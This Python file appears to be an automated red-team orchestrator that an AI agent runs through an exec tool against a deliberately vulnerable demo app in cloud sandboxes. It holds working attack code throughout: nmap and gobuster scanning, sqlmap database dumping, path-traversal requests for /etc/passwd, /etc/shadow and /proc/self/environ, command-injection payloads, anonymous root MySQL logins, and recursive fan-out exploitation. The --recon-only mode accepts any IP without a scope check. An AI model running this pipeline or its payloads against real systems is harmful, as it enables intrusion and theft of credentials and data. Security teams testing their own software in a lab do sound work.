"""
red_team.py — OpenClaw Red Team Orchestrator

This script is the Python execution layer that OpenClaw's agent invokes via
its `exec` tool when the recon and exploit skills instruct it to do so.

It can also be run standalone for development and demo purposes.

ARCHITECTURE:
  OpenClaw (Node.js gateway, reads skills/)
      └─ instructs agent via SKILL.md system prompt injection
          └─ agent calls exec("python3 orchestrator/red_team.py ...")
              └─ this script uses Daytona Python SDK to:
                  1. Spin up the Harbinger target sandbox
                  2. Snapshot it immediately (for demo reset via --reset flag)
                  3. Spin up a recon sandbox, run nmap + gobuster
                  4. For each finding, spawn parallel exploit sandboxes (asyncio)
                  5. If exploit succeeds, fan out further sandboxes (capped at MAX_DEPTH)
                  6. Write all findings to output/findings.json

CREDENTIAL FLOW (Jentic Mini):
  Credentials (DAYTONA_API_KEY etc.) are stored in Jentic Mini's encrypted vault.
  Jentic Mini injects them into the process environment at runtime via the
  toolkit key (tk_xxx). This script never needs to handle raw keys directly
  when running inside the OpenClaw + Jentic Mini stack.

Usage:
  # Full pipeline (normal run):
  python3 orchestrator/red_team.py

  # Reset target to clean snapshot before a demo replay:
  python3 orchestrator/red_team.py --reset

  # Recon only (for debugging):
  python3 orchestrator/red_team.py --recon-only --target-ip 10.88.0.5

Environment (set in .env or injected by Jentic Mini):
  DAYTONA_API_KEY    — Daytona API key
  DAYTONA_API_URL    — Daytona server URL (default: https://app.daytona.io/api)
  TARGET_IMAGE       — Docker image for the Harbinger target (openclaw/target:latest)
  RED_IMAGE          — Docker image for attack sandboxes (openclaw/red:latest)
  MAX_DEPTH          — Exploit fan-out depth cap (default: 3)
  MAX_PARALLEL       — Max concurrent exploit sandboxes (default: 8)
  SNAPSHOT_NAME      — Snapshot name for --reset (default: openclaw-target-clean)
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import signal
import sys
import uuid
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from daytona_sdk import Daytona, DaytonaConfig, CreateSandboxParams
from dotenv import load_dotenv

load_dotenv()

# ── Configuration ──────────────────────────────────────────────────────────────
DAYTONA_API_KEY = os.environ["DAYTONA_API_KEY"]
DAYTONA_API_URL = os.getenv("DAYTONA_API_URL", "https://app.daytona.io/api")
TARGET_IMAGE    = os.getenv("TARGET_IMAGE", "openclaw/target:latest")
RED_IMAGE       = os.getenv("RED_IMAGE",    "openclaw/red:latest")
MAX_DEPTH       = int(os.getenv("MAX_DEPTH", "3"))
MAX_PARALLEL    = int(os.getenv("MAX_PARALLEL", "8"))
SNAPSHOT_NAME   = os.getenv("SNAPSHOT_NAME", "openclaw-target-clean")

OUTPUT_PATH = Path(__file__).parent.parent / "output" / "findings.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("red_team")

# ── Global state ───────────────────────────────────────────────────────────────

# Registry of all live sandbox objects — used by the shutdown handler to
# guarantee cleanup even if the script is interrupted mid-run.
_REGISTRY: dict[str, Any] = {}   # sandbox_id -> sandbox object

_DAYTONA: Daytona | None = None  # single client instance, created in main()


def _build_client() -> Daytona:
    """Instantiate the Daytona SDK client from environment credentials."""
    config = DaytonaConfig(
        api_key=DAYTONA_API_KEY,
        server_url=DAYTONA_API_URL,
    )
    return Daytona(config)


# ── Signal handling — clean up all sandboxes on Ctrl-C or SIGTERM ──────────────

async def _cleanup_all() -> None:
    """Destroy every sandbox registered during this run."""
    if not _REGISTRY:
        return
    log.info("Signal received — destroying %d sandboxes...", len(_REGISTRY))
    tasks = [_destroy_sandbox(sid) for sid in list(_REGISTRY.keys())]
    await asyncio.gather(*tasks, return_exceptions=True)


def _handle_signal(sig, frame):  # noqa: ANN001
    log.warning("Caught signal %s — shutting down", sig)
    asyncio.get_event_loop().run_until_complete(_cleanup_all())
    sys.exit(1)


signal.signal(signal.SIGINT,  _handle_signal)
signal.signal(signal.SIGTERM, _handle_signal)


# ── Daytona SDK wrappers ───────────────────────────────────────────────────────
# These wrap the synchronous SDK calls in run_in_executor so that the async
# orchestrator loop is never blocked by a slow Daytona API call.

async def _create_sandbox(image: str, label: str,
                           env: dict[str, str] | None = None,
                           snapshot: str | None = None) -> Any:
    """
    Provision a Daytona sandbox.

    If `snapshot` is provided, the sandbox is restored from that saved state
    rather than starting from a fresh image — used by the --reset path.
    """
    loop = asyncio.get_event_loop()

    def _create():
        params = CreateSandboxParams(
            # Use snapshot if restoring, otherwise use the image directly
            snapshot=snapshot or image,
            env_vars=env or {},
            labels={"openclaw.label": label, "openclaw.run": "red-team"},
        )
        return _DAYTONA.create(params)

    sandbox = await loop.run_in_executor(None, _create)
    _REGISTRY[sandbox.id] = sandbox
    log.info("[%s] provisioned sandbox %s", label, sandbox.id)

    # Poll until the sandbox responds to a simple command — confirms it's ready
    for attempt in range(30):
        try:
            result = await _exec(sandbox.id, "echo ready", timeout=10)
            if "ready" in result["output"]:
                break
        except Exception:
            pass
        await asyncio.sleep(2)
    else:
        raise RuntimeError(f"Sandbox {sandbox.id} never became ready after 60s")

    # Resolve the sandbox's internal IP address
    ip_result = await _exec(sandbox.id, "hostname -I | awk '{print $1}'")
    ip = ip_result["output"].strip()
    log.info("[%s] sandbox %s ready at %s", label, sandbox.id, ip)

    return sandbox, ip


async def _exec(sandbox_id: str, cmd: str, timeout: int = 120) -> dict:
    """
    Execute a shell command inside a sandbox.
    Returns {"exit_code": int, "output": str, "stderr": str}.
    """
    loop = asyncio.get_event_loop()
    sandbox = _REGISTRY[sandbox_id]

    def _run():
        # Daytona SDK: sandbox.process.execute_command(cmd, timeout=...)
        return sandbox.process.execute_command(cmd, timeout=timeout)

    result = await loop.run_in_executor(None, _run)
    return {
        "exit_code": result.exit_code,
        "output":    result.result or "",
        "stderr":    getattr(result, "stderr", "") or "",
    }


async def _destroy_sandbox(sandbox_id: str) -> None:
    """Remove a sandbox and deregister it from the registry."""
    loop = asyncio.get_event_loop()
    sandbox = _REGISTRY.pop(sandbox_id, None)
    if sandbox is None:
        return
    try:
        await loop.run_in_executor(None, lambda: _DAYTONA.remove(sandbox))
        log.info("Destroyed sandbox %s", sandbox_id)
    except Exception as exc:
        log.warning("Failed to destroy %s: %s", sandbox_id, exc)


# ── Snapshot / restore ─────────────────────────────────────────────────────────

async def snapshot_target(sandbox_id: str) -> str:
    """
    Save the current state of the target sandbox as a named snapshot.

    This is called immediately after the target is healthy so that:
      - demo runs can be reset to a clean state with --reset
      - the target's initial log state is preserved for comparison

    Returns the snapshot name that can be passed to --reset.
    """
    loop = asyncio.get_event_loop()
    sandbox = _REGISTRY[sandbox_id]

    log.info("Snapshotting target sandbox %s as '%s'...", sandbox_id, SNAPSHOT_NAME)

    def _snap():
        # Daytona SDK: create a reusable snapshot from the running sandbox.
        # The snapshot name becomes the image reference for future CreateSandboxParams.
        return _DAYTONA.snapshot(sandbox, SNAPSHOT_NAME)

    await loop.run_in_executor(None, _snap)
    log.info("Snapshot '%s' saved — use --reset to restore for demo replay", SNAPSHOT_NAME)
    return SNAPSHOT_NAME


async def restore_target_from_snapshot() -> tuple[Any, str]:
    """
    Provision a new sandbox from the saved snapshot (--reset path).

    Destroys any existing target sandbox first, then creates a fresh one
    from the clean snapshot so the demo starts from a known-good state.
    """
    log.info("Restoring target from snapshot '%s'...", SNAPSHOT_NAME)
    sandbox, ip = await _create_sandbox(
        image=SNAPSHOT_NAME,         # snapshot name is used as the image reference
        label="target-restored",
        snapshot=SNAPSHOT_NAME,      # tells Daytona SDK to restore, not create fresh
    )
    log.info("Target restored from snapshot at %s", ip)
    return sandbox, ip


# ── Recon skill ────────────────────────────────────────────────────────────────

def _parse_nmap_xml(xml_text: str) -> list[dict]:
    """Parse nmap XML output into a list of open-port dicts."""
    findings = []
    try:
        root = ET.fromstring(xml_text)
        for port_el in root.findall(".//port"):
            state = port_el.find("state")
            if state is None or state.get("state") != "open":
                continue
            svc    = port_el.find("service")
            portnum = int(port_el.get("portid", 0))
            svc_name = svc.get("name", "unknown") if svc is not None else "unknown"
            svc_ver  = (
                f"{svc.get('product', '')} {svc.get('version', '')}".strip()
                if svc is not None else ""
            )
            findings.append({
                "port":     portnum,
                "protocol": port_el.get("protocol", "tcp"),
                "state":    "open",
                "service":  svc_name,
                "version":  svc_ver,
            })
    except ET.ParseError as e:
        log.warning("nmap XML parse error: %s", e)
    return findings


def _parse_gobuster(output: str, port: int) -> list[dict]:
    """Parse gobuster directory brute-force output into path dicts."""
    paths = []
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("["):
            continue
        parts = line.split()
        if not parts or not parts[0].startswith("/"):
            continue
        path   = parts[0]
        status = None
        size   = None
        for p in parts:
            if p.startswith("(Status:"):
                try:
                    status = int(p.strip("(Status:)"))
                except ValueError:
                    pass
            if p.startswith("[Size:"):
                try:
                    size = int(p.strip("[Size:]"))
                except ValueError:
                    pass
        paths.append({"path": path, "status": status, "size": size, "port": port})
    return paths


def _assign_severity(port_finding: dict, path: str | None) -> str:
    """Heuristic severity based on port and path."""
    port    = port_finding["port"]
    service = port_finding.get("service", "")
    path    = (path or "").lower()

    if port in (3306, 5432, 27017):
        return "critical"
    if any(kw in path for kw in ["diag", "ping", "exec", "check", "cmd"]):
        return "critical"
    if any(kw in path for kw in ["report", "file", "download", "name="]):
        return "high"
    if any(kw in path for kw in ["query", "search", "inventory", "sort", "id="]):
        return "high"
    if service in ("http", "https"):
        return "medium"
    if port == 22:
        return "medium"
    return "low"


async def run_recon(sandbox_id: str, target_ip: str) -> dict[str, Any]:
    """
    Run nmap full-port scan then gobuster against all discovered HTTP ports.
    Returns structured JSON that feeds directly into the exploit queue.
    """
    log.info("Starting recon against %s from sandbox %s", target_ip, sandbox_id)

    # ── nmap ──────────────────────────────────────────────────────────────────
    nmap_cmd = (
        f"nmap -sV -sC -T4 -p 1-65535 --open -oX /tmp/nmap.xml {target_ip} 2>&1 && "
        f"cat /tmp/nmap.xml"
    )
    nmap_result = await _exec(sandbox_id, nmap_cmd, timeout=300)
    port_findings = _parse_nmap_xml(nmap_result["output"])
    log.info("nmap: %d open ports found", len(port_findings))

    # ── gobuster ──────────────────────────────────────────────────────────────
    # Run against all HTTP ports discovered by nmap, plus port 5000 as a fallback
    http_ports = list({
        f["port"] for f in port_findings
        if f["service"] in ("http", "http-alt", "https", "werkzeug")
    } | {5000})

    # Custom wordlist tuned for API-style paths (baked into the red image)
    api_wordlist = "/usr/share/wordlists/openclaw-api.txt"
    dirb_wordlist = "/usr/share/wordlists/dirb/common.txt"

    path_findings: list[dict] = []

    async def _gobust(port: int) -> list[dict]:
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{target_ip}:{port}"
        cmd = (
            f"gobuster dir -u {url} -w {dirb_wordlist} -q --no-error "
            f"-o /tmp/gobuster_{port}.txt 2>/dev/null; "
            f"cat /tmp/gobuster_{port}.txt"
        )
        result = await _exec(sandbox_id, cmd, timeout=120)
        return _parse_gobuster(result["output"], port)

    # Run gobuster on all HTTP ports concurrently
    results = await asyncio.gather(*[_gobust(p) for p in http_ports], return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            path_findings.extend(r)

    log.info("gobuster: %d paths discovered", len(path_findings))

    return {
        "target":      target_ip,
        "sandbox_id":  sandbox_id,
        "ports":       port_findings,
        "paths":       path_findings,
        "raw_nmap":    nmap_result["output"],
    }


# ── Exploit skill ──────────────────────────────────────────────────────────────

def _select_tool(target_ip: str, finding: dict) -> tuple[str, str]:
    """
    Choose the right exploit tool and build the command string based on
    what the recon finding looks like. This mirrors the tool selection
    matrix documented in skills/exploit/SKILL.md.
    """
    port    = finding["port"]
    service = finding.get("service", "")
    path    = finding.get("path", "") or ""
    url     = f"http://{target_ip}:{port}{path}"
    path_lc = path.lower()

    # SQL injection candidates: paths with query parameters that look like search/filter
    if service in ("http", "https") and any(
        kw in path_lc for kw in ["query=", "search=", "sort=", "filter=", "id="]
    ):
        cmd = (
            f"sqlmap -u '{url}' --batch --level=3 --risk=2 "
            f"--technique=BEUST --dump --output-dir=/tmp/sqlmap "
            f"--timeout=30 2>&1 | tail -80"
        )
        return "sqli", cmd

    # Path traversal candidates: file/report/download paths
    if service in ("http", "https") and any(
        kw in path_lc for kw in ["report", "file", "download", "name=", "path="]
    ):
        # Probe for absolute-path bypass and relative traversal
        cmd = (
            f"curl -s '{url}?name=/etc/passwd' && echo '---' && "
            f"curl -s '{url}?name=/var/log/procs.log' && echo '---' && "
            f"curl -s '{url}?name=../../../etc/passwd'"
        )
        return "path_traversal", cmd

    # Command injection candidates: diagnostic/ping/connectivity endpoints
    if service in ("http", "https") and any(
        kw in path_lc for kw in ["diag", "ping", "check", "connect", "host=", "target="]
    ):
        # Try double-ampersand bypass and unicode-escape bypass
        cmd = (
            "curl -s -X POST -H 'Content-Type: application/json' "
            f"'{url}' -d '{{\"target\":\"127.0.0.1 \\u0026\\u0026 id\"}}' && echo '---' && "
            "curl -s -X POST -H 'Content-Type: application/json' "
            f"'{url}' -d '{{\"target\":\"127.0.0.1 \\u0026\\u0026 cat /etc/passwd\"}}'"
        )
        return "cmdi", cmd

    # Anonymous MySQL access
    if port == 3306 or service == "mysql":
        cmd = f"mysql -h {target_ip} -u root --connect-timeout=5 -e 'show databases;' 2>&1"
        return "mysql_anon", cmd

    # Fallback: curl probe to collect response headers and body
    cmd = f"curl -sv '{url}' 2>&1 | head -100"
    return "curl_probe", cmd


def _parse_evidence(technique: str, output: str) -> tuple[bool, dict]:
    """
    Determine whether an exploit succeeded and extract relevant evidence.
    Returns (success: bool, evidence: dict).
    """
    ev: dict = {"raw_snippet": output[:3000]}

    if technique == "sqli":
        # sqlmap success indicators
        if any(kw in output.lower() for kw in
               ["table:", "dumped to", "retrieved:", "[info] fetched", "database:"]):
            tables = [l.split("Table:")[-1].strip() for l in output.splitlines() if "Table:" in l]
            ev["dumped_tables"] = tables
            ev["payload_worked"] = True
            return True, ev
        # Error-based leakage still counts
        if "operationalerror" in output.lower() or "syntax error" in output.lower():
            ev["sql_error_leaked"] = True
            return True, ev

    if technique == "path_traversal":
        if "root:" in output or "bin:" in output or "/bin/bash" in output:
            ev["passwd_read"] = True
            ev["sample"] = output[:500]
            return True, ev
        if "Q" in output and "Revenue" in output:   # our fake report content
            ev["internal_file_read"] = True
            return True, ev

    if technique == "cmdi":
        if any(kw in output for kw in ["uid=", "gid=", "root:", "www-data"]):
            ev["command_executed"] = True
            ev["sample"] = output[:500]
            return True, ev

    if technique == "mysql_anon":
        if "information_schema" in output.lower():
            ev["anonymous_access"] = True
            ev["databases"] = [l.strip() for l in output.splitlines() if l.strip()]
            return True, ev

    return False, ev


def _fan_out_vectors(technique: str, target_ip: str, port: int, path: str,
                     evidence: dict) -> list[dict]:
    """
    Given a successful exploit, return additional findings worth chasing.
    These become new entries in the exploit queue, each getting their own
    fresh sandbox in the next recursion level.
    """
    vectors = []

    if technique == "sqli":
        # Chase each dumped table for a full data dump
        for table in evidence.get("dumped_tables", []):
            vectors.append({
                "port": port, "service": "http",
                "path": f"{path}&sort=1,(SELECT+GROUP_CONCAT({table}))",
                "type": "sqli_table_dump", "severity": "critical",
            })

    if technique == "path_traversal" and evidence.get("passwd_read"):
        # Try to read more sensitive files
        for sensitive in ["/etc/shadow", "/proc/self/environ",
                           "/var/log/harbinger_access.log", "/tmp/harbinger.db"]:
            vectors.append({
                "port": port, "service": "http",
                "path": f"/api/report?name={sensitive}",
                "type": "path_traversal_deep", "severity": "critical",
            })

    if technique == "cmdi" and evidence.get("command_executed"):
        # Try to exfiltrate /etc/passwd and enumerate the filesystem
        vectors.append({
            "port": port, "service": "http",
            "path": "/api/diagnostics",
            "type": "cmdi_exfil", "severity": "critical",
            "payload_hint": "cat /etc/passwd",
        })

    return vectors


async def run_exploit(sandbox_id: str, target_ip: str,
                      finding: dict, depth: int = 0) -> dict[str, Any]:
    """
    Attempt exploitation of a single finding in the given sandbox.

    Each finding runs in its own fresh sandbox so that:
    - Evidence is not contaminated across findings
    - A crashed sandbox doesn't kill other workers
    - Cleanup is deterministic

    Returns a finding dict that is appended to the aggregated findings list.
    """
    port    = finding["port"]
    path    = finding.get("path", "")
    technique, cmd = _select_tool(target_ip, finding)

    log.info("[depth=%d] %s against %s:%s%s", depth, technique, target_ip, port, path)

    rc_result = await _exec(sandbox_id, cmd, timeout=300)
    output    = rc_result["output"] + rc_result["stderr"]

    success, evidence = _parse_evidence(technique, output)
    deeper = []
    if success and depth < MAX_DEPTH:
        # Fan out: queue additional vectors revealed by this finding
        deeper = _fan_out_vectors(technique, target_ip, port, path, evidence)
        if deeper:
            log.info("[depth=%d] %s spawned %d deeper vectors", depth, technique, len(deeper))

    return {
        "id":            str(uuid.uuid4()),
        "success":       success,
        "technique":     technique,
        "type":          technique,
        "severity":      finding.get("severity", "medium"),
        "target":        f"{target_ip}:{port}{path}",
        "evidence":      evidence,
        "raw_output":    output[:5000],
        "sandbox_id":    sandbox_id,
        "depth":         depth,
        "deeper_vectors": deeper,
        "error":         None if rc_result["exit_code"] == 0 else f"exit={rc_result['exit_code']}",
        "timestamp":     datetime.now(timezone.utc).isoformat(),
    }


# ── Parallel exploitation worker ───────────────────────────────────────────────

async def _exploit_worker(
    target_ip: str,
    finding: dict,
    semaphore: asyncio.Semaphore,
    all_findings: list[dict],
    depth: int = 0,
) -> None:
    """
    Acquire a semaphore slot, spin up a fresh sandbox, run the exploit,
    then fan out on deeper vectors recursively.

    The semaphore bounds MAX_PARALLEL concurrent sandboxes so we don't
    overload the Daytona quota.
    """
    if depth > MAX_DEPTH:
        return

    # Hold the semaphore for the full lifecycle of this sandbox
    async with semaphore:
        label  = f"exploit-d{depth}-{finding.get('technique', finding.get('service', 'x'))}"
        sandbox = None
        try:
            sandbox, _ = await _create_sandbox(RED_IMAGE, label)
            result = await run_exploit(sandbox.id, target_ip, finding, depth)
            all_findings.append(result)

            log.info("Finding %s: success=%s technique=%s depth=%d",
                     result["id"][:8], result["success"], result["technique"], depth)

            # If this exploit worked, immediately fan out parallel sandboxes
            # for each deeper vector it revealed (one sandbox per vector).
            if result["success"] and result["deeper_vectors"]:
                child_tasks = [
                    _exploit_worker(target_ip, v, semaphore, all_findings, depth + 1)
                    for v in result["deeper_vectors"]
                ]
                await asyncio.gather(*child_tasks, return_exceptions=True)

        except Exception as exc:
            log.error("Exploit worker failed for %s: %s", finding.get("path"), exc)
            all_findings.append({
                "id": str(uuid.uuid4()), "success": False,
                "type": "error", "severity": "low",
                "target": target_ip, "evidence": {},
                "raw_output": str(exc), "error": str(exc),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })
        finally:
            # Always clean up the sandbox, even on error
            if sandbox is not None:
                await _destroy_sandbox(sandbox.id)


# ── Main orchestrator ──────────────────────────────────────────────────────────

async def main(args: argparse.Namespace) -> None:
    global _DAYTONA
    _DAYTONA = _build_client()

    all_findings: list[dict] = []
    target_sandbox = recon_sandbox = None

    try:
        # ── Phase 0: --reset path — restore target from saved snapshot ──────────
        if args.reset:
            log.info("=== Phase 0: Restoring target from snapshot ===")
            target_sandbox, target_ip = await restore_target_from_snapshot()
            log.info("Target restored at %s — ready for demo replay", target_ip)
            # On --reset we just restore and exit; the caller re-runs the pipeline
            return

        # ── Phase 1: Spin up the Harbinger target ────────────────────────────────
        if not args.recon_only:
            log.info("=== Phase 1: Provisioning Harbinger target ===")
            target_sandbox, target_ip = await _create_sandbox(TARGET_IMAGE, "harbinger-target")

            # Give Flask a moment to finish initialising the SQLite DB
            await asyncio.sleep(8)

            # Verify the app is responding
            health_result = await _exec(target_sandbox.id, "curl -sf http://localhost:5000/health")
            log.info("Target health: %s", health_result["output"][:100])

            # Snapshot immediately after the target is healthy.
            # This snapshot is what --reset restores from.
            await snapshot_target(target_sandbox.id)

        else:
            # --recon-only: target IP provided via CLI, no target sandbox to manage
            target_ip = args.target_ip
            log.info("=== Recon-only mode, target IP: %s ===", target_ip)

        # ── Phase 2: Recon ────────────────────────────────────────────────────────
        log.info("=== Phase 2: Recon ===")
        recon_sandbox, _ = await _create_sandbox(RED_IMAGE, "recon-worker")
        recon_results     = await run_recon(recon_sandbox.id, target_ip)

        # Free the recon sandbox early — we don't need it after this
        await _destroy_sandbox(recon_sandbox.id)
        recon_sandbox = None

        if args.recon_only:
            print(json.dumps(recon_results, indent=2))
            return

        # ── Phase 3: Build exploit queue ──────────────────────────────────────────
        # Flatten recon output into (port, service, path, severity) tuples.
        # Each unique combination becomes one exploit sandbox.
        log.info("=== Phase 3: Building exploit queue ===")
        exploit_queue: list[dict] = []
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}

        for port_f in recon_results["ports"]:
            paths_for_port = [p for p in recon_results["paths"] if p["port"] == port_f["port"]]
            if paths_for_port:
                for path_entry in paths_for_port:
                    sev = _assign_severity(port_f, path_entry["path"])
                    exploit_queue.append({**port_f, "path": path_entry["path"], "severity": sev})
            else:
                sev = _assign_severity(port_f, None)
                exploit_queue.append({**port_f, "severity": sev})

        # Sort by severity so critical findings get sandboxes first
        exploit_queue.sort(key=lambda f: sev_order.get(f.get("severity", "low"), 99))
        log.info("Exploit queue: %d items (sorted by severity)", len(exploit_queue))

        # ── Phase 4: Parallel exploitation ────────────────────────────────────────
        log.info("=== Phase 4: Parallel exploitation (max %d concurrent) ===", MAX_PARALLEL)
        semaphore = asyncio.Semaphore(MAX_PARALLEL)
        tasks = [
            _exploit_worker(target_ip, f, semaphore, all_findings, depth=0)
            for f in exploit_queue
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    finally:
        # ── Phase 5: Write findings ───────────────────────────────────────────────
        log.info("=== Phase 5: Writing findings ===")
        OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)

        summary = {
            "run_id":              str(uuid.uuid4()),
            "timestamp":           datetime.now(timezone.utc).isoformat(),
            "target_ip":           target_ip if "target_ip" in dir() else "unknown",
            "snapshot_name":       SNAPSHOT_NAME,
            "total_findings":      len(all_findings),
            "successful_exploits": sum(1 for f in all_findings if f.get("success")),
            "findings":            all_findings,
        }

        OUTPUT_PATH.write_text(json.dumps(summary, indent=2))
        log.info(
            "Done. %d findings (%d successful) → %s",
            len(all_findings),
            summary["successful_exploits"],
            OUTPUT_PATH,
        )

        # Clean up remaining sandboxes (target + any that leaked through)
        if recon_sandbox:
            await _destroy_sandbox(recon_sandbox.id)
        if target_sandbox and not args.recon_only:
            await _destroy_sandbox(target_sandbox.id)
        await _cleanup_all()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OpenClaw Red Team Orchestrator")
    parser.add_argument(
        "--reset", action="store_true",
        help="Restore the target sandbox from its clean snapshot (for demo replay)",
    )
    parser.add_argument(
        "--recon-only", action="store_true",
        help="Run recon against an already-running target (skips provisioning)",
    )
    parser.add_argument(
        "--target-ip", type=str, default="",
        help="Target IP when using --recon-only",
    )
    args = parser.parse_args()

    if args.recon_only and not args.target_ip:
        parser.error("--recon-only requires --target-ip")

    asyncio.run(main(args))
